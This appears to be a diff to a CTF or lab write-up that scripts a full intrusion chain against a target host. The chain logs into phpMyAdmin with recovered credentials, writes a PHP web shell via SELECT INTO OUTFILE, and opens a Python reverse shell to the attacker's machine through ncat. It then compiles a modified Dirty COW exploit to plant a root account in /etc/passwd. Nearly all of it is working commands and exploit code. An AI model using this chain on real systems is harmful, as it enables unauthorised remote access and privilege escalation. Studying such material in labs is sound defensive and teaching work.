@@ -65,22 +65,44 @@ echo $db_password
 
 ## Inspect Database (PhpMyAdmin)
 
-### Manual execute SQL injection (hard to automate)
+### Auth and get token
+```shell
+db_cookie_path="scripts/writeup1/db_cookie.txt"
+curl https://$IP/phpmyadmin/index.php -X POST -k -c $db_cookie_path --data-raw "pma_username=$db_login&pma_password=$db_password" 2>/dev/null | grep "token" | head -n 1 | cut -d "=" -f 8 | cut -d "&" -f 1
+token=`curl https://$IP/phpmyadmin/index.php -k -b $db_cookie_path 2>/dev/null | grep "token" | head -n 1 | cut -d "=" -f 3 | cut -d "'" -f 1`
+echo $token
+```
 
-Paste this injection to PMA
+### Inject executor
 ```sql
 SELECT 1, '<?php system($_GET["execute"]." 2>&1"); ?>' INTO OUTFILE '/var/www/forum/templates_c/executor.php'
 ```
-At now, we can execute any command provide by ?execute query parameter at /forum/templates_c/executor.php
-
-### Start ncat
+Execute by POST request
 ```shell
-ncat -nvklp 1234
+curl https://$IP/phpmyadmin/import.php -X POST -k -b $db_cookie_path --data-raw "is_js_confirmed=0&token=$token&pos=0&goto=server_sql.php&message_to_show=SQL-%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81+%D0%B1%D1%8B%D0%BB+%D1%83%D1%81%D0%BF%D0%B5%D1%88%D0%BD%D0%BE+%D0%B2%D1%8B%D0%BF%D0%BE%D0%BB%D0%BD%D0%B5%D0%BD&prev_sql_query=&sql_query=SELECT+1%2C+'%3C%3Fphp+system(%24_GET%5B%22execute%22%5D.%22+2%3E%261%22)%3B+%3F%3E'+INTO+OUTFILE+'%2Fvar%2Fwww%2Fforum%2Ftemplates_c%2Fexecutor.php'&bkm_label=&sql_delimiter=%3B&show_query=1&ajax_request=true"
 ```
 
+At now, we can execute any command provide by ?execute query parameter at /forum/templates_c/executor.php
+
 ### Intercept stdin and stdout
+Declare executor
 ```shell
-curl -k https://$IP/forum/templates_c/executor.php?execute="python%20-c%20'import%20socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$HOST_IP\",1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=pty.spawn(\"/bin/bash\");'"
+executor () {
+  cmd=`echo "$1" | sed 's/ /%20/g'`
+  curl -s -k https://$IP/forum/templates_c/executor.php?execute=$cmd
+}
+reverse_shell () {
+  screen -ls | grep '(Detached)' | awk '{print $1}' | xargs -I % -t screen -X -S % quit
+  screen -dmS ncat bash -c 'sleep 1; ncat -nvklp 1234'
+  reverse_shell_cmd="python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$HOST_IP\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn(\"/bin/bash\");'"
+  sleep 3
+  executor $reverse_shell_cmd &
+  screen -r ncat && kill %2
+}
+```
+### Run reverse shell
+```shell
+reverse_shell
 ```
 
 ### Dirty cow exploit
@@ -104,7 +126,7 @@ cat > /tmp/dirty.c << EOF
 
 const char *filename = "/etc/passwd";
 const char *backup_filename = "/tmp/passwd.bak";
-const char *salt = "firefart";
+const char *salt = "lrorscha";
 
 int f;
 void *map;
@@ -188,7 +210,7 @@ int main(int argc, char *argv[])
 
   struct Userinfo user;
   // set values, change as needed
-  user.username = "firefart";
+  user.username = "lrorscha";
   user.user_id = 0;
   user.group_id = 0;
   user.info = "pwned";
@@ -256,14 +278,18 @@ EOF
 
 ##### Compile binary
 ```shell
-gcc /tmp/dirty.c -o /tmp/dirty -pthread -lcrypt
+executor "gcc /tmp/dirty.c -o /tmp/dirty -pthread -lcrypt"
 ```
 
-##### Execute binary
+##### Execute binary and set password
 ```shell
-rm -f /tmp/passwd.bak
-/tmp/dirty
-mv /tmp/passwd.bak /etc/passwd
+executor "rm -f /tmp/passwd.bak"
+echo $IP > scripts/writeup1/ip
+screen -dm bash -c 'sleep 1; bash scripts/writeup1/executor.sh "/tmp/dirty test" `cat scripts/writeup1/ip`'
+sleep 5
+rm scripts/writeup1/ip
+screen -ls | grep '(Detached)' | awk '{print $1}' | xargs -I % -t screen -X -S % quit
+sleep 30
 ```
 
 And just follow the dirty tips
